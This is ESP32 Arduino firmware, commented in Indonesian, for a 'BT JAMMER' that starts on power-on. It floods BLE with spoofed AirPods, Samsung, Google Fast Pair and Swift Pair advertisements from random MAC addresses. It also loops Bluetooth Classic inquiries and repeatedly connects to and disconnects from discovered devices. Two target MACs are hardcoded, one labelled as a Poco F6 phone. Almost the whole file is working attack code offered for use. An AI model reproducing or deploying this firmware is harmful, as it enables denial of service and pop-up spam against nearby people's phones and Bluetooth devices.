/*
 * BT JAMMER — dedicated, auto-start saat power-on.
 * BLE advertising flood + BR/EDR inquiry flood + auto connect/disconnect.
 * Serial 921600 hanya untuk status NDJSON. Tidak ada command, tidak ada WiFi.
 */

#include <Arduino.h>
#include <ArduinoJson.h>
#include <WiFi.h>
#include <BLEDevice.h>
#include <BluetoothSerial.h>
#include <esp_bt.h>
#include <esp_gap_bt_api.h>
#include <esp_gap_ble_api.h>

#include <cstring>
#include <cstdio>

/* ---- tuning ---- */
#define BLE_ADV_MS        25
#define BLE_GAP_MS        10
#define BLE_POWER         9
#define BT_INQUIRY_MS     10000
#define BT_CONNECT_ENABLE true
#define BT_CONNECT_HOLD_MS 500
#define BT_CONNECT_GAP_MS  200
#define BT_MAX_DEVICES    32
#define STATUS_MS         2000

// Target tetap (opsional). Bisa juga ditambah lewat serial: "add AA:BB:CC:DD:EE:FF"
static const char *TARGET_MACS[] = {
  "F0:2C:7B:AE:3F:BE",  // Poco F6
  "03:7B:B3:75:AD:02",  // XFW-BT
};
#define TARGET_MAC_COUNT (sizeof(TARGET_MACS) / sizeof(TARGET_MACS[0]))
#define MAX_BT_TARGETS   16

/* ---- BLE payloads ---- */
static uint8_t bleAirpods[] = {
  0x1e,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,
  0x45,0x12,0x12,0x12,0,0,0,0,0,0,0,0,0,0,0
};
static uint8_t bleSamsung[] = {
  0x0e,0xff,0x75,0x00,0x01,0x00,0x02,0x00,0x01,0x01,0xff,0x00,0x00,0x43,0x00
};
static uint8_t bleGoogle[] = {
  0x03,0x03,0x2c,0xfe,0x06,0x16,0x2c,0xfe,0x00,0x00
};
static uint8_t bleSwift[] = {
  0x03,0x03,0x5f,0xfd,0x0a,0xff,0x06,0x00,0x03,0x00,0x80,0x00,0x00,0x00
};
static uint8_t *blePayloads[] = { bleAirpods, bleSamsung, bleGoogle, bleSwift };
static uint8_t bleLens[] = {
  sizeof(bleAirpods), sizeof(bleSamsung), sizeof(bleGoogle), sizeof(bleSwift)
};
#define BLE_PAYLOAD_COUNT (sizeof(blePayloads) / sizeof(blePayloads[0]))
static uint8_t bleRandom[31];

/* ---- state ---- */
static esp_ble_adv_params_t bleAdvParams;
static bool     bleActive = false;
static uint32_t bleLast = 0;
static uint32_t bleStart = 0;
static uint32_t bleSent = 0;
static uint32_t bleErrors = 0;
static uint8_t  bleCursor = 0;
static bool     blePaused = false;

struct BtDevice {
  bool used;
  uint8_t mac[6];
  char name[40];
  int8_t rssi;
};
struct BtTarget {
  bool used;
  uint8_t mac[6];
};
static BtTarget btTargets[MAX_BT_TARGETS];
static uint8_t btTargetCount = 0;

static BtDevice btDevices[BT_MAX_DEVICES];
static uint8_t  btDeviceCount = 0;
static BtDevice btPending;
static volatile bool btPendingNew = false;
static volatile bool btRestartInquiry = false;

static BluetoothSerial *btSerial = nullptr;
static bool     btInited = false;

enum BtState : uint8_t {
  BT_INQUIRY = 0,
  BT_CONNECT,
  BT_HOLD,
  BT_GAP
};
static BtState  btState = BT_INQUIRY;
static uint32_t btStateStart = 0;
static uint32_t btConnectPhaseStart = 0;
static uint8_t  btCursor = 0;
static uint8_t  btConnectIndex = 0;
static uint32_t btInquiryCount = 0;
static uint32_t btConnectCount = 0;
static uint32_t btConnectErrors = 0;
static bool     btConnected = false;
static bool     btLimited = false;

static void macToStr(const uint8_t m[6], char out[18]) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
           m[0], m[1], m[2], m[3], m[4], m[5]);
}

static bool parseMac(const char *s, uint8_t out[6]) {
  if (!s || strlen(s) != 17) return false;
  unsigned int m[6];
  if (sscanf(s, "%02x:%02x:%02x:%02x:%02x:%02x",
             &m[0], &m[1], &m[2], &m[3], &m[4], &m[5]) != 6) return false;
  for (int i = 0; i < 6; i++) out[i] = (uint8_t)m[i];
  return true;
}

static bool addTarget(const char *s) {
  uint8_t m[6];
  if (!parseMac(s, m)) return false;
  for (uint8_t i = 0; i < btTargetCount; i++) {
    if (memcmp(btTargets[i].mac, m, 6) == 0) return true;
  }
  if (btTargetCount >= MAX_BT_TARGETS) return false;
  btTargets[btTargetCount].used = true;
  memcpy(btTargets[btTargetCount].mac, m, 6);
  btTargetCount++;
  return true;
}

static void cmdPoll() {
  static char line[64];
  static uint8_t len = 0;
  while (Serial.available()) {
    char c = (char)Serial.read();
    if (c == '\n' || c == '\r') {
      if (!len) continue;
      line[len] = 0;
      len = 0;
      const char *arg = line;
      if (!strncmp(line, "add ", 4)) arg = line + 4;
      else if (!strncmp(line, "clear", 5)) {
        memset(btTargets, 0, sizeof(btTargets));
        btTargetCount = 0;
        Serial.println("targets cleared");
        continue;
      } else if (!strncmp(line, "list", 4)) {
        Serial.printf("targets: %u\n", btTargetCount);
        continue;
      }
      Serial.println(addTarget(arg) ? "target added" : "bad mac / full");
    } else if (len < sizeof(line) - 1) {
      line[len++] = c;
    } else {
      len = 0;
    }
  }
}

/* ---- BLE --------------------------------------------------------------- */

static void bleRandomMac(uint8_t m[6]) {
  for (int i = 0; i < 6; i++) m[i] = esp_random() & 0xFF;
  m[5] = (m[5] & 0x3F) | 0xC0;
}

static void bleInit() {
  BLEDevice::init("bt-jammer");
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)BLE_POWER);
  memset(&bleAdvParams, 0, sizeof(bleAdvParams));
  bleAdvParams.adv_int_min       = 0x20;
  bleAdvParams.adv_int_max       = 0x20;
  bleAdvParams.adv_type          = ADV_TYPE_NONCONN_IND;
  bleAdvParams.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
  bleAdvParams.channel_map       = ADV_CHNL_ALL;
  bleAdvParams.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
}

static void bleBuildRandom() {
  bleRandom[0] = 0x02; bleRandom[1] = 0x01; bleRandom[2] = 0x06;
  bleRandom[3] = 0x1b; bleRandom[4] = 0xFF;
  bleRandom[5] = esp_random() & 0xFF;
  bleRandom[6] = esp_random() & 0xFF;
  for (int i = 7; i < 31; i++) bleRandom[i] = esp_random() & 0xFF;
}

static void bleEmit(uint8_t *data, uint8_t len) {
  uint8_t mac[6];
  bleRandomMac(mac);
  esp_ble_gap_set_rand_addr(mac);
  esp_ble_gap_config_adv_data_raw(data, len);
  delay(2);
  if (esp_ble_gap_start_advertising(&bleAdvParams) == ESP_OK) {
    bleActive = true;
    bleStart = millis();
  } else {
    bleErrors++;
  }
}

static void bleTick() {
  uint32_t now = millis();
  if (bleActive) {
    if ((uint32_t)(now - bleStart) >= BLE_ADV_MS) {
      esp_ble_gap_stop_advertising();
      bleActive = false;
      bleLast = now;
    }
    return;
  }
  if ((uint32_t)(now - bleLast) < BLE_GAP_MS) return;

  uint8_t *data = bleRandom;
  uint8_t len = sizeof(bleRandom);
  uint8_t pick = bleCursor++ % (BLE_PAYLOAD_COUNT + 1);
  if (pick < BLE_PAYLOAD_COUNT) {
    data = blePayloads[pick];
    len = bleLens[pick];
  } else {
    bleBuildRandom();
  }
  bleEmit(data, len);
  bleSent++;
}

static void blePause() {
  if (!blePaused) {
    if (bleActive) {
      esp_ble_gap_stop_advertising();
      bleActive = false;
    }
    blePaused = true;
  }
}

static void bleResume() {
  if (blePaused) {
    blePaused = false;
    bleLast = millis();
  }
}

/* ---- BT Classic -------------------------------------------------------- */

static void btGapCb(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
  if (event == ESP_BT_GAP_DISC_STATE_CHANGED_EVT) {
    if (param->disc_st_chg.state == ESP_BT_GAP_DISCOVERY_STOPPED) {
      btRestartInquiry = true;
    }
    return;
  }
  if (event == ESP_BT_GAP_READ_REMOTE_NAME_EVT) {
    if (param->read_rmt_name.stat != ESP_BT_STATUS_SUCCESS) return;
    memset(&btPending, 0, sizeof(btPending));
    memcpy(btPending.mac, param->read_rmt_name.bda, 6);
    uint8_t n = 0;
    while (n < sizeof(btPending.name) - 1 && param->read_rmt_name.rmt_name[n]) n++;
    memcpy(btPending.name, param->read_rmt_name.rmt_name, n);
    btPending.name[n] = 0;
    btPending.rssi = -127;
    btPendingNew = true;
    return;
  }
  if (event != ESP_BT_GAP_DISC_RES_EVT || btPendingNew) return;

  memset(&btPending, 0, sizeof(btPending));
  memcpy(btPending.mac, param->disc_res.bda, 6);
  btPending.rssi = -127;
  for (int i = 0; i < param->disc_res.num_prop; i++) {
    esp_bt_gap_dev_prop_t &p = param->disc_res.prop[i];
    if (p.type == ESP_BT_GAP_DEV_PROP_BDNAME && p.val && p.len > 0) {
      uint8_t n = (uint8_t)min(p.len, (int)sizeof(btPending.name) - 1);
      memcpy(btPending.name, p.val, n);
      btPending.name[n] = 0;
    } else if (p.type == ESP_BT_GAP_DEV_PROP_RSSI && p.val && p.len >= 1) {
      btPending.rssi = ((int8_t *)p.val)[0];
    }
  }
  if (!btPending.name[0]) esp_bt_gap_read_remote_name(btPending.mac);
  btPendingNew = true;
}

static void btInit() {
  if (btInited) return;
  btSerial = new BluetoothSerial();
  btSerial->begin("bt-jammer", false);
  esp_bt_gap_register_callback(btGapCb);
  btInited = true;
}

static void emitBtDevice(const BtDevice &d) {
  char mac[18];
  macToStr(d.mac, mac);
  JsonDocument doc;
  doc["type"] = "bt_device";
  doc["addr"] = mac;
  doc["name"] = d.name;
  doc["rssi"] = d.rssi;
  serializeJson(doc, Serial);
  Serial.write('\n');
}

static void btStore(const BtDevice &in) {
  for (uint8_t i = 0; i < BT_MAX_DEVICES; i++) {
    if (btDevices[i].used && memcmp(btDevices[i].mac, in.mac, 6) == 0) {
      bool newName = !btDevices[i].name[0] && in.name[0];
      if (in.name[0]) memcpy(btDevices[i].name, in.name, sizeof(btDevices[i].name));
      if (in.rssi != -127) btDevices[i].rssi = in.rssi;
      if (newName) emitBtDevice(btDevices[i]);
      return;
    }
  }
  for (uint8_t i = 0; i < BT_MAX_DEVICES; i++) {
    if (btDevices[i].used) continue;
    btDevices[i] = in;
    btDevices[i].used = true;
    if (btDeviceCount < BT_MAX_DEVICES) btDeviceCount++;
    emitBtDevice(btDevices[i]);
    return;
  }
}

static void btPollResults() {
  if (!btPendingNew) return;
  BtDevice in = btPending;
  btPendingNew = false;
  btStore(in);
}

static void btStartInquiry() {
  btRestartInquiry = false;
  btLimited = !btLimited;
  esp_bt_gap_start_discovery(
    btLimited ? ESP_BT_INQ_MODE_LIMITED_INQUIRY : ESP_BT_INQ_MODE_GENERAL_INQUIRY,
    0x0a, 0);
  btInquiryCount++;
}

static void btTick() {
  uint32_t now = millis();
  btPollResults();

  switch (btState) {
    case BT_INQUIRY:
      if ((uint32_t)(now - btStateStart) >= BT_INQUIRY_MS || btRestartInquiry) {
        esp_bt_gap_cancel_discovery();
        btRestartInquiry = false;
        btState = BT_CONNECT;
        btStateStart = now;
        btConnectPhaseStart = now;
        btConnectIndex = 0;
        bleResume();
      }
      break;

    case BT_CONNECT: {
#if BT_CONNECT_ENABLE
      // Kalau semua percobaan koneksi gagal, jangan mengunci radio di sini —
      // kembali ke inquiry supaya perangkat baru tetap bisa ditemukan.
      if ((uint32_t)(now - btConnectPhaseStart) >= 3000) {
        btState = BT_INQUIRY;
        btStateStart = now;
        blePause();
        btStartInquiry();
        break;
      }
      if ((uint32_t)(now - btStateStart) < BT_CONNECT_GAP_MS) break;
      uint8_t addr[6];
      bool have = false;
      if (btTargetCount) {
        uint8_t i = (uint8_t)(btConnectIndex % btTargetCount);
        memcpy(addr, btTargets[i].mac, 6);
        btConnectIndex = (uint8_t)((i + 1) % btTargetCount);
        have = true;
      }
      for (uint8_t k = 0; !have && k < BT_MAX_DEVICES; k++) {
        uint8_t i = (uint8_t)((btConnectIndex + k) % BT_MAX_DEVICES);
        if (!btDevices[i].used) continue;
        memcpy(addr, btDevices[i].mac, 6);
        btConnectIndex = (uint8_t)((i + 1) % BT_MAX_DEVICES);
        have = true;
        break;
      }
      if (!have) {
        for (int i = 0; i < 6; i++) addr[i] = esp_random() & 0xFF;
        addr[5] &= 0xFE;
      }
      bool ok = btSerial && btSerial->connect(addr);
      if (ok) {
        btConnected = true;
        btConnectCount++;
        btState = BT_HOLD;
      } else {
        btConnectErrors++;
      }
      btStateStart = now;
#else
      btState = BT_INQUIRY;
      btStateStart = now;
#endif
      break;
    }

    case BT_HOLD:
      if ((uint32_t)(now - btStateStart) >= BT_CONNECT_HOLD_MS) {
        if (btConnected && btSerial) btSerial->disconnect();
        btConnected = false;
        btState = BT_GAP;
        btStateStart = now;
      }
      break;

    case BT_GAP:
      if ((uint32_t)(now - btStateStart) >= BT_CONNECT_GAP_MS) {
        btState = BT_INQUIRY;
        btStateStart = now;
        blePause();
        btStartInquiry();
      }
      break;
  }
}

/* ---- setup / loop ------------------------------------------------------ */

static uint32_t lastStatus = 0;

void setup() {
  Serial.begin(921600);
  for (uint8_t i = 0; i < TARGET_MAC_COUNT; i++) addTarget(TARGET_MACS[i]);
  // Sama seperti firmware gabungan yang sudah terbukti stabil: WiFi dulu,
  // baru BLE, baru BT Classic — ada jeda supaya controller BT siap.
  WiFi.mode(WIFI_STA);
  delay(500);
  bleInit();
  delay(500);
  btInit();
  delay(500);
  btStateStart = millis();
  blePause();
  btStartInquiry();
}

void loop() {
  cmdPoll();
  if (!blePaused) bleTick();
  btTick();

  if ((uint32_t)(millis() - lastStatus) >= STATUS_MS) {
    lastStatus = millis();
    JsonDocument d;
    d["type"] = "status";
    d["fw"] = "bt-jammer-1.0.0";
    d["ble_sent"] = bleSent;
    d["ble_errors"] = bleErrors;
    d["ble_paused"] = blePaused;
    d["inquiry"] = btInquiryCount;
    d["connect"] = btConnectCount;
    d["connect_errors"] = btConnectErrors;
    d["devices"] = btDeviceCount;
    d["targets"] = btTargetCount;
    serializeJson(d, Serial);
    Serial.write('\n');
  }
}
